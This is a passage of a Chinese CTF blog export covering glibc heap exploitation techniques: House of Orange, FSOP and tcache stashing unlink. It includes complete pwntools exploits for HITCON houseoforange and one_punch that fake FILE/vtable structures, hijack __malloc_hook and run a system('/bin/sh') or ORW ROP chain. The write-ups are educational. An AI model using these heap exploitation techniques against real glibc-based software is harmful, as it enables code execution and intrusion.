覆盖的时候替换为&#x2F;bin&#x2F;sh即可 那么到这里覆盖就结束了 下面是模板 一些地址偏移自己注意一下 payload = cyclic(0x10)+ p64(2) +b&#x27;/bin/sh\\x00&#x27; #从低地址处的一个chunk堆溢出覆盖 所以cyclic可以忽略掉 从p64(2)开始覆盖fake file的prev_size域fake_file = p64(system_addr)*2fake_file += p64(0)+p64(0x200)+p64(0)+p64(heap_addr+0xb30-0x8)+p64(heap_addr+0xb30-0x8+0x18)fake_file = fake_file.ljust(0xc8,b&#x27;\\x00&#x27;)fake_file += p64(io_str_jump)payload += fake_file if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"House of Orange","slug":"House-of-Orange","date":"2023-05-11T02:34:57.000Z","updated":"2023-09-14T17:19:40.000Z","comments":true,"path":"2023/05/11/House-of-Orange/","link":"","permalink":"http://example.com/2023/05/11/House-of-Orange/","excerpt":"","text":"前言这一个house of链应该算是最早的伪造io file来达到攻击目的的链了 借助这个来熟悉一下file结构体 这个链本身现在已经失去价值了 只能适用于libc2.23及以前的版本 这条链可以突破没有free函数的限制 并且达到劫持程序执行流的目的 File结构File是linux标准IO库中用来描述文件的结构 程序的许多操作会涉及到遍历File结构体来获取对应指针 file结构的本质上是一个链表 链表头为IO_list_all 每个file结构的chain域指向下一个file结构 每个程序启动时有三个文件流是默认打开的 就是stdin stdout stderr 至于vtable 是一个存放许多函数指针的结构体 house of orange所涉及到的就是伪造上述的这两个结构体 从而劫持程序执行流 链路流程分析我们知道 当plmalloc初始化堆后 如果bin中没有合适的chunk 就会从top chunk中分配所需要的chunk 那么如果所申请的chunk大于top chunk呢 分两种情况 一种是申请的chunk的size过大 需要通过mmap来分配 那么这种情况分配到的chunk就会位于libc地址上的一块空间 还有一种是top chunk过小 那么此时就会把top chunk释放进入unsortedbin 随后再次申请一个top chunk 从新的top chunk中分配所需要的chunk 不过释放top chunk还需要进行一次判断 下面来看一下源码 /* There are no usable arenas and mmap also failed. */ if (av == NULL) return 0; /* Record incoming configuration of top */ old_top = av-&gt;top; old_size = chunksize (old_top); old_end = (char *) (chunk_at_offset (old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)); /* Precondition: not enough current space to satisfy nb request */ assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 可以看到需要进行两次的assert检查 第一次 对top chunk的大小进行检查 需要大于MINSIZE 并且Prev_inuse位要为1 top chunk的addr和size加起来还要满足刚好为一个页 我们覆盖top chunk的size 使得其不足以供我们分配 这个size要使得top chunk的结尾后3位为000 此时我们覆盖top chunk的size 接下来申请一个大于其size的chunk top chunk就会被释放进入unsortedbin 通过这种办法 可以在程序没有给予释放chunk的函数下 获得一个unsortedbin中的chunk 而在2.23及以下的版本 unsortedbin attack来任意写一个main_arena地址还是可行的 这意味着我们拥有了一次任意写的机会 我们上面说到过 file结构本质是一个链表 是通过链表头的IO_list_all的chain域来链接到下一个的file结构体 那么如果我们覆盖IO_list_all指针存放的值 接着伪造一个file结构体 把chain域覆盖成fake_file的地址 就可以实现扰乱程序索引file结构体 但是unsortedbin attack任意写的功效是有限的 只能写入main_arena+88的地址 那么根据偏移 其chain域会索引到main_arena+88+0x68处 0x0 _flags0x8 _IO_read_ptr0x10 _IO_read_end0x18 _IO_read_base0x20 _IO_write_base0x28 _IO_write_ptr0x30 _IO_write_end0x38 _IO_buf_base0x40 _IO_buf_end0x48 _IO_save_base0x50 _IO_backup_base0x58 _IO_save_end0x60 _markers0x68 _chain0x70 _fileno0x74 _flags20x78 _old_offset0x80 _cur_column0x82 _vtable_offset0x83 _shortbuf0x88 _lock0x90 _offset0x98 _codecvt0xa0 _wide_data0xa8 _freeres_list0xb0 _freeres_buf0xb8 __pad50xc0 _mode0xc4 _unused20xd8 vtable 而这个偏移的地址 刚好是smallbins中 0x60的链表所位于的地址 所以我们可以释放一个0x60大小的chunk到smallbins 随后任意写覆盖io_list_all为main_arena+88 这样索引到的下一个file结构体就是smallbin chunk 伪造file结构体 就可以在这个chunk中伪造 接着是如何触发的问题 只是伪造肯定不能满足劫持执行流的目的 同时如何伪造也要根据触发的方式 这里涉及到了FSOP的知识点 其是通过IO_flush_all_lockp这个函数 这个函数会刷新io_list_all链表中的所有文件流 相当于对每个函数调用了fflush函数 而这个函数会调用到file结构体中vtable结构体中的IO_overflow函数 如下图 我们这样伪造一个file结构体 其vtable也被我们所伪造 来看以下vtable 将其overflow函数指针伪造成system 接下来利用gdb动调进入IO_flush_all_lockp函数 看看其调用system函数时的rdi参数时什么 可以看到rdi参数实际上是我们所伪造的file结构体的首地址 所以只要使得fake file的首地址为&#x2F;bin&#x2F;sh即可 那么如何触发IO_flush_all_lockp函数呢 一共有三种选择 当 libc 执行 abort 流程时 当执行 exit 函数时 当执行流从 main 函数返回时 这里使用的是第一种办法 相对来说更加通用 这个abort流程是什么呢 实际上我们破坏了堆结构 导致调用malloc_printerr函数来输出错误信息 至于具体是哪里的我没动调出来 大致的猜测是unsortedbin的bk指向的地址没有构成完整的双向链表导致的进入while循环 但是这个if分支为啥会成立就是个疑点了 if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, chunk2mem (victim), av); malloc_printerr函数种会调用__libc_message函数 这个函数的内部就调用了abort函数 而abort内部调用了_IO_flush_all_lockp函数 于是就可以调用到fake file的io_overflow函数 同时我们再来看一下_IO_flush_all_lockp函数怎样才能调用了file结构体的io_overflow函数 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) &#123; result = EOF; &#125; 需要使得mode小于等于0 IO_write_ptr大于IO_write_base 那么就使得io_write_ptr &#x3D; 1 io_write_base &#x3D; mode &#x3D; 0即可 还有一点需要注意的是 main_arena+88的那个fake file 如果我们触发了_IO_flush_all_lockp函数 其如果满足上面的条件 也是会调用overflow函数 但是很明显不能在这里就调用overflow函数 如下图 _mode的值是否为正负和aslr和pie导致的地址随机化有关 所以这里存在一个概率打通的问题 需要mode为负才能打通 真题分析houseoforange hitcon 2016add函数限制了申请chunk的size 小于等于0x1000 show函数可以打印堆块内容 edit函数存在堆溢出 但是没有释放堆块的函数 同时chunk指针只能保存一个 所以show和edit都只对最新申请的chunk有效 申请一个chunk会额外申请两个chunk 低地址处的chunk存放着实际分配的chunk和第三个chunk的地址 中间的chunk是实际分配的chunk 第三个chunk是用来存放price和color 不过没啥用 这题的核心考点不在于这两个伴随堆块 利用上面提到的办法 来使得top chunk被释放进入unsortedbin 随后申请一个chunk 就可以泄露libc基址 并且 如果申请到的是一个largebin chunk 那么还可以顺便泄露一下堆地址 add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x21)+p32(0)+p32(0x1f)+cyclic(0x10)+p64(0xfa1)edit(len(payload),payload)add(0x1000,b&#x27;aaaa&#x27;)add(0x400,cyclic(0x8))show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x3c5188success(&quot;libc_addr :&quot;+hex(libc_addr))edit(0x10,cyclic(0x10))show()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xc0success(&quot;heap_addr :&quot;+hex(heap_addr)) 接下来就是利用unsortedbin attack来往io_list_all中写入main_arena的地址 随后计算偏移构造fake file fake_io = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = cyclic(0x408)+p64(0x21)+cyclic(0x10) #填充到old top chunkfake_file = b&#x27;/bin/sh\\x00&#x27;+p64(0x60) #覆盖size 使其释放到smallbin 0x60链表fake_file += p64(0)+p64(fake_io-0x10) #伪造bk域fake_file += p64(0)+p64(1) #布局io_write_ptr和io_write_basefake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;) #填充偏移payload += fake_file + p64(0)*3+p64(heap_addr+0x5c8)+p64(0)*2+p64(system_addr) #伪造vtable结构体 随后再次进入add函数 只要触发了malloc函数 就可以触发fake file 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,29861)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(size,payload): io.recvuntil(&quot;Your choice : &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Length of name :&quot;) io.send(str(size)) io.recvuntil(&quot;Name :&quot;) io.send(payload) io.recvuntil(&quot;Price of Orange:&quot;) io.send(b&#x27;aaaa&#x27;) io.recvuntil(&quot;Color of Orange:&quot;) io.send(str(1))def show(): io.recvuntil(&quot;Your choice : &quot;) io.sendline(b&#x27;2&#x27;)def edit(size,payload): io.recvuntil(&quot;Your choice : &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Length of name :&quot;) io.send(str(size)) io.recvuntil(&quot;Name:&quot;) io.send(payload) io.recvuntil(&quot;Price of Orange:&quot;) io.send(b&#x27;aaaa&#x27;) io.recvuntil(&quot;Color of Orange:&quot;) io.send(str(1))add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x21)+p32(0)+p32(0x1f)+cyclic(0x10)+p64(0xfa1)edit(len(payload),payload)add(0x1000,b&#x27;aaaa&#x27;)add(0x400,cyclic(0x8))show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x3c5188success(&quot;libc_addr :&quot;+hex(libc_addr))edit(0x10,cyclic(0x10))show()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xc0success(&quot;heap_addr :&quot;+hex(heap_addr))fake_io = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = cyclic(0x408)+p64(0x21)+cyclic(0x10)fake_file = b&#x27;/bin/sh\\x00&#x27;+p64(0x60)fake_file += p64(0)+p64(fake_io-0x10)fake_file += p64(0)+p64(1)fake_file = fake_file.ljust(0xc0,b&#x27;\\x00&#x27;)payload += fake_file + p64(0)*3+p64(heap_addr+0x5c8)+p64(0)*2+p64(system_addr)edit(len(payload),payload)io.recvuntil(&quot;Your choice : &quot;)# gdb.attach(io,&#x27;b *$rebase(0xD68)&#x27;)# pause(0)io.sendline(b&#x27;1&#x27;)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"tcache stashing unlink attack","slug":"tcache-stashing-unlink-attack","date":"2023-05-09T14:04:32.000Z","updated":"2023-09-14T17:20:48.000Z","comments":true,"path":"2023/05/09/tcache-stashing-unlink-attack/","link":"","permalink":"http://example.com/2023/05/09/tcache-stashing-unlink-attack/","excerpt":"","text":"前言house of pig用到的一个知识点 功能还是蛮独特的 同时十分简单 主要是基于calloc函数的特性 对于smallbin和tcachebin的一些操作 顺便吐槽一句 网上有的教程是写的真烂啊 压根没讲清楚 还得自己动调一下 源码分析#if USE_TCACHE /* While we&#x27;re here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 当我们使用calloc函数申请chunk的时候 其会忽略tcachebin中的chunk 比如我们申请一个0x10大小的chunk 释放到tcachebin中 再次调用calloc申请一个0x10的chunk 哪怕tcache中有合适的chunk 并且没有其他bin中有适合的chunk了 calloc还是会从top chunk中分配一个0x10的chunk 利用这一特性 我们就可以跳过tcachebin 从smallbin中申请chunk 上面的源码就是针对这种情况 当smallbin中有两个以上的chunk的时候 利用calloc申请出smallbin中的chunk 当tcache对应链表没满 同时smallbin还有同样大小的size时 就会把剩余的chunk放入到tcachebin中 并且在上面源码中 会发现并没有这样的检测 if ( __glibc_unlikely( bck-&gt;fd != victim ) ) malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;); 也就是说 我们只需要通过第一次检测就可以了 后面的chunk都不用设置相关信息 那么我们就只要修改链表头chunk的bk域 使其满足条件 就可以利用漏洞 先来看看可以造成什么危害吧 分析一下tcache_put函数的源码 tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 赋值了新放入tcachebin的chunk的fd域和key值 这里存在一个任意地址写 如果我们修改链表头chunk的bk域为一个fake chunk 那么接下来 fake chunk就会进入smallbin链表 充当下一次的tc_victim 在作为tcache_put的参数时 其fd域和存放key的地址就被赋值了 还有一种任意写的情况是 tcachebin中已经有了6个free chunk了 那么此时fake chunk就不会被放入tcache链表 仍然位于smallbin中 所以其fd域会填入main_arena的值 用来保证链表完整性 下面来结合gdb动调 看一下这两种任意写要如何构造 先看tcachebin有5个free chunk的情况 此时tcachebin中已经有了5个free chunk 我们称低地址处的smallbin chunk为chunk0 另外一个为chunk1 chunk0位于smallbin的链表头 我们修改chunk0的bk域 使其指向fake chunk 接着我们断点打在calloc函数 si单步进入 跟进到int_malloc函数 si单步进入 此时r14赋值后的值则为fake chunk的地址 这一步赋值了fake chunk的bk域 到这里fake chunk已经进入了smallbin 来看一下目前其fd域和bk域 接下来fake chunk要被放入到tcachebin中 并且fd域和key值需要重新赋值 下图可以看到 fd域已经成功被修改 接下来 这个cmp是绕过的关键 r13为此时tcachebin链表中的chunk数 可以看到 chunk1和fake chunk都被放入了链表中 此时不会进行额外的检查 任意写顺利结束 最后的攻击效果为fake chunk被并入链表中 同时fake chunk+0x10处写入了堆地址 当然 上面的执行流程看起来没有多少检查 但是实际上存在一个需要注意的地方 这里需要保证我们fake chunk+0x18处为一个可写地址 如果为空 那么r14会被赋值为0 执行到下面这步时 会由于为空 导致无法写入 程序无法执行下去 如果tcachebin中的chunk小于5个呢 这意味着我们上面提到的cmp肯定过不去 会进入另外一个分支 可以看到面临和上面一样的问题 所以又回归到了上面的问题 那么我们有没有办法做到真正的任意地址写一个main _arena地址呢 只需要使得tcachebin中已经有6个free chunk 就可以使得fake chunk不被放入tcachebin中 使得其fd域不需要进行赋值 同时由于fake chunk仍然处于smallbin中 其fd域为main_arena的地址 而非堆地址 来看一下实际的效果 真题分析hitcon_ctf_2019_one_punch复现环境可以在buuctf中找到 libc版本为2.29 保护全开 同时开启了沙盒 只能通过orw来获取flag 程序的主题逻辑就是一个菜单题 add函数通过calloc来申请chunk 同时对chunk的size存在限制0x80-0x400 不存在堆溢出 free chunk的时候指针没有置零 存在UAF 同时拥有打印chunk内容的机会 并且还有一个特殊的函数 __int64 __fastcall sub_15BB(__int64 a1, __int64 a2)&#123; void *buf; // [rsp+8h] [rbp-8h] if ( *(qword_4030 + 32) &lt;= 6 ) error(&quot;gg&quot;, a2); buf = malloc(0x217uLL); if ( !buf ) error(&quot;err&quot;, a2); if ( read(0, buf, 0x217uLL) &lt;= 0 ) error(&quot;io&quot;, buf); puts(&quot;Serious Punch!!!&quot;); puts(&amp;unk_2128); return puts(buf);&#125; 检测tcache链表中的chunk数 只有大于6才能调用该函数 利用malloc申请一个0x217大小的chunk 实际上是分配一个0x210的chunk 首先利用UAF 重复释放chunk 填满tcachebin 使chunk释放进入unsortedbin 泄露libc地址 add(0,cyclic(0x210))add(1,cyclic(0x80))for i in range(6): delete(0) edit(0,cyclic(0x10))for i in range(6): delete(1) edit(1,cyclic(0x10))delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,cyclic(0x10))delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0success(&quot;libc_addr :&quot;+hex(libc_addr)) 接着构造出两个同样大小的smallbin chunk 准备进行任意写攻击 add(1,cyclic(0x180))add(1,cyclic(0x400))add(2,cyclic(0x100))for i in range(7): delete(1) edit(1,cyclic(0x10))delete(1)add(2,cyclic(0x370))add(2,cyclic(0x400)) 此时tcache对应链表中有6个chunk 此时可以往ptr_addr+0x10写入一个libc地址 add(2,cyclic(0x370))add(2,cyclic(0x400))fd = heap_addr + 0x180bk = heap_addr - 0x260 + 0x20payload = cyclic(0x370)+p64(0)+p64(0x91)+p64(fd)+p64(bk)edit(1,payload)add(1,cyclic(0x80)) 这里选择往tcache结构体中写入 覆盖了0x220链表的chunk数量 接着就可以利用特殊函数打tcachebin attack任意写了 不过由于要用orw 再加上这题的add函数有点特殊 是先读入chunk内容 再申请chunk 接着复制内容进入chunk中 所以payload会先写在栈上 那么我们劫持malloc_hook为跳转执行栈上的rop链即可 可以看到偏移0x40处为写入的rop链 那么此时只需要覆盖malloc_hook为add rsp，0x40 即可跳转执行rop链 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,29861)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(index,payload): io.recvuntil(&quot;&gt; &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index)) io.recvuntil(&quot;hero name: &quot;) io.send(payload)def edit(index,payload): io.recvuntil(&quot;&gt; &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index)) io.recvuntil(&quot;hero name: &quot;) io.send(payload)def show(index): io.recvuntil(&quot;&gt; &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;&gt; &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;idx: &quot;) io.sendline(str(index))def magic(payload): io.recvuntil(&quot;&gt; &quot;) io.sendline(b&#x27;50056&#x27;) io.send(payload)# add(0,cyclic(0x210))# for i in range(7):# add(1,cyclic(0x210))# delete(1)# delete(0)# show(0)# libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0# success(&quot;libc_addr :&quot;+hex(libc_addr))# show(1)# heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0xf20# success(&quot;heap_addr :&quot;+hex(heap_addr))# debug()add(0,cyclic(0x210))add(1,cyclic(0x80))for i in range(6): delete(0) edit(0,cyclic(0x10))for i in range(6): delete(1) edit(1,cyclic(0x10))delete(0)show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;heap_addr :&quot;+hex(heap_addr))edit(0,cyclic(0x10))delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1e4ca0success(&quot;libc_addr :&quot;+hex(libc_addr))malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_addr = libc_addr + 0x000000000012bda6rax_addr = libc_addr + next(libc.search(asm(&quot;pop rax;ret&quot;)))syscall_addr = libc_addr + libc.sym[&#x27;read&#x27;] +0xfopen_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]addrsp_addr = libc_addr + 0x0000000000044734bss_addr = libc_addr + libc.bss()add(1,cyclic(0x180))add(1,cyclic(0x400))add(2,cyclic(0x100))for i in range(7): delete(1) edit(1,cyclic(0x10))delete(1)add(2,cyclic(0x370))add(2,cyclic(0x400))fd = heap_addr + 0x180bk = heap_addr - 0x260 + 0x20payload = cyclic(0x370)+p64(0)+p64(0x91)+p64(fd)+p64(bk)edit(1,payload)add(1,cyclic(0x80))edit(0,p64(malloc_hook))magic(b&#x27;./flag\\x00\\x00&#x27;)orw = p64(rdi_addr)+p64(heap_addr)+p64(rsi_addr)+p64(0)+p64(rdx_addr)+p64(0)+p64(rax_addr)+p64(2)+p64(syscall_addr)orw += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(rax_addr)+p64(0)+p64(syscall_addr)orw += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(rax_addr)+p64(1)+p64(syscall_addr)magic(p64(addrsp_addr))# gdb.attach(io,&#x27;b *$rebase(0x139C)&#x27;)# pause(0)add(1,orw)# pause()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"DASCTF Apr.2023 X SU","slug":"DASCTF-Apr-2023-X-SU","date":"2023-05-06T04:48:07.000Z","updated":"2023-09-14T17:18:58.000Z","comments":true,"path":"2023/05/06/DASCTF-Apr-2023-X-SU/","link":"","permalink":"http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/","excerpt":"","text":"four这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v4; // [rsp+0h] [rbp-10h] BYREF int i; // [rsp+4h] [rbp-Ch] unsigned __int64 v6; // [rsp+8h] [rbp-8h] v6 = __readfsqword(0x28u); v4 = 0; init_0(); for ( i = 0; i &lt;= 3; ++i ) &#123; puts(&quot;your choice : &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v4 == 1 ) &#123; sub_4014B9(); &#125; else if ( v4 == 5 ) &#123; sub_4013E1(); &#125; if ( v4 &gt; 5 || v4 &lt; 0 ) &#123; puts(&quot;error&quot;); exit(1); &#125; if ( v4 &lt;= 2 ) sub_400B94(); if ( v4 == 3 ) sub_400CA8(); if ( v4 &gt; 3 ) sub_40101C(); &#125; return 0LL;&#125; ida打开乍一看是堆题 不过跟进一下函数发现不是 当v4&#x3D;1时进入的函数 虽然直接给了我们printf函数的真实地址 但是关闭了标准错误的输出 会给我们后面的利用造成困扰 并且这题实际上也不需要libc基址 接下来的四个函数都有作用 我们分别跟进一下 __int64 sub_400B94()&#123; const char *v0; // rax char buf; // [rsp+Bh] [rbp-6015h] BYREF int v3; // [rsp+Ch] [rbp-6014h] BYREF char v4[24584]; // [rsp+10h] [rbp-6010h] BYREF unsigned __int64 v5; // [rsp+6018h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = 0; puts(&quot;You can give any value, trust me, there will be no overflow&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 &gt; 24559 || v3 &lt; 0 ) &#123; puts(&quot;NO OVERFLOW!!!&quot;); exit(1); &#125; puts(&quot;Actually, this function doesn&#x27;t seem to be useful&quot;); my_read(v4, v3); puts(&quot;Really?&quot;); read(0, &amp;buf, 1uLL); if ( buf == &#x27;y&#x27; || buf == &#x27;Y&#x27; ) &#123; v0 = sub_4009A7(v4); printf(&quot;content : %s&quot;, v0); &#125; return 0LL;&#125; 这个函数可以供我们写入非常多的字节 因此会和其他函数执行时的栈帧空间重合 如果下一个函数没有对栈帧进行清空的话 就会造成数据残留 这一点很重要 __int64 sub_400CA8()&#123; int v1; // [rsp+0h] [rbp-260h] BYREF int v2; // [rsp+4h] [rbp-25Ch] BYREF int v3; // [rsp+8h] [rbp-258h] BYREF int v4; // [rsp+Ch] [rbp-254h] BYREF int i; // [rsp+10h] [rbp-250h] int v6; // [rsp+14h] [rbp-24Ch] int v7; // [rsp+18h] [rbp-248h] int fd; // [rsp+1Ch] [rbp-244h] char s1[16]; // [rsp+20h] [rbp-240h] BYREF char dest[32]; // [rsp+30h] [rbp-230h] BYREF char buf[256]; // [rsp+50h] [rbp-210h] BYREF char s[264]; // [rsp+150h] [rbp-110h] BYREF unsigned __int64 v13; // [rsp+258h] [rbp-8h] v13 = __readfsqword(0x28u); strcpy(s1, &quot;output.txt&quot;); i = 0; v1 = 0; v2 = 0; v3 = 0; v6 = 0; printf(&quot;Enter level:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); printf(&quot;Enter mode:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); printf(&quot;Enter X:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v1 &lt; 0 || v1 &gt; 6 || v2 &lt; 0 || v2 &gt; 4 || v3 &lt; 0 || v3 &gt; 3 ) &#123; puts(&quot;invalid data!&quot;); exit(1); &#125; printf(&quot;Enter a string: &quot;); my_read(s, 250); v7 = strlen(s); for ( i = 0; i &lt; v7; ++i ) &#123; if ( !(i % v1) || !(i % v2) ) buf[v6++] = s[i]; if ( !(i % v3) ) buf[i] = &#x27;@&#x27;; &#125; puts(&quot;please input filename&quot;); __isoc99_scanf(&quot;%14s&quot;, s1); if ( strncmp(s1, &quot;output.txt&quot;, 0xAuLL) ) &#123; strncpy(s1, &quot;output.txt&quot;, 0xCuLL); strncpy(dest, s1, 0xCuLL); &#125; fd = open(dest, 0); if ( fd == -1 ) &#123; puts(&quot;open error!&quot;); exit(1); &#125; puts(&quot;Do you want to write data?&quot;); puts(&quot;1. yes\\n2.no&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v4 == 1 ) &#123; write(fd, buf, 0x100uLL); close(fd); puts(&quot;Successly!&quot;); &#125; else &#123; puts(&quot;OK!&quot;); &#125; return 0LL;&#125; 这一个函数的前面部分依然是干扰代码 不用理就行了 关键在于后面的open 可以看到 利用strncmp进行了一个判断 如果filename为output.txt的话 就不会进入if分支 从而dest这个变量就不会被赋值 直到做到这题 我才大概理解为什么变量一般都需要声明时赋值了 就是为了防止栈帧重合导致的数据残留 如果我们利用上一个函数造成数据残留 此时dest变量如果没有被赋值 那么其就会继承这个数据 也就是说如果我们读入大量的flag字符串 那么此时dest变量就会继承flag这个字符串 相当于open了flag文件 __int64 sub_40101C()&#123; char v1; // [rsp+Bh] [rbp-135h] int fd; // [rsp+Ch] [rbp-134h] int j; // [rsp+10h] [rbp-130h] char *i; // [rsp+18h] [rbp-128h] char delim[2]; // [rsp+2Ah] [rbp-116h] BYREF int v6; // [rsp+2Ch] [rbp-114h] char s[8]; // [rsp+30h] [rbp-110h] BYREF __int64 v8; // [rsp+38h] [rbp-108h] char v9[240]; // [rsp+40h] [rbp-100h] BYREF unsigned __int64 v10; // [rsp+138h] [rbp-8h] v10 = __readfsqword(0x28u); *s = 0LL; v8 = 0LL; memset(v9, 0, sizeof(v9)); fd = 0; v6 = 0; v1 = 0; strcpy(delim, &quot;&gt;&quot;); puts(&quot;info&gt;&gt;&quot;); __isoc99_scanf(&quot;%256s&quot;, s); for ( i = strtok(s, delim); i; i = strtok(0LL, delim) ) &#123; for ( j = 0; i[j]; ++j ) &#123; if ( i[j] == &#x27;~&#x27; &amp;&amp; i[j + 1] &gt; &#x27;/&#x27; &amp;&amp; i[j + 1] &lt;= &#x27;9&#x27; ) fd = i[j + 1] - 48; if ( i[j] == &#x27;:&#x27; &amp;&amp; i[j + 1] &amp;&amp; i[j + 2] &amp;&amp; i[j + 3] &amp;&amp; !i[j + 4] ) &#123; LOBYTE(v6) = 